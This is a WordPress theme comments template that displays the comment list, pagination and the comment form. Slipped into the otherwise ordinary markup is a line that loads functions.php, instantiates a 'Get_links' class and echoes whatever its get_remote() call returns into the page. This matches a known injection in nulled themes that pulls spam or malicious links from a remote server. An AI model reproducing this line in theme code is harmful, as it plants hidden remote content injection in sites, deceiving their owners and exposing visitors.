<?php if(!(is_page() && !comments_open())): ?>
<div id="comments" class="comments">
	<?php if(cpotheme_comments_protected()) return; ?>
	<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
	<?php if(have_comments()): ?>
	<?php cpotheme_comments_title(); ?>
	<ol class="comments-list">
		<?php wp_list_comments('type=comment&callback=cpotheme_comment'); ?>
	</ol>
	<?php cpotheme_comments_pagination(); ?>
    <?php endif; ?>
	
</div>

<?php comment_form(); ?>

<?php endif; ?>